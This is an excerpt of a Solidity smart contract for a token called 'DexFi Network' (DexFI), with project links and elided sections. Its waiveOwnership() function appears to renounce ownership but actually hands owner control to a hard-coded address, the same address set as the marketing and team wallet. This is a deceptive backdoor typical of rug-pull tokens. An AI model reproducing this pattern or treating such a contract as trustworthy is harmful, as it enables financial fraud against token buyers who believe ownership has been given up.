...
/**
Telegram :https://t.me/DexfiNetwork
Web      :https://www.dexfinetwork.com/
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6123A3fCb6390eaE572c5c00b320358fdE72a562);
    }
...
contract DexFI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DexFi Network";
    string private _symbol = "DexFI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6123A3fCb6390eaE572c5c00b320358fdE72a562);
    address payable public teamWalletAddress = payable(0x6123A3fCb6390eaE572c5c00b320358fdE72a562);
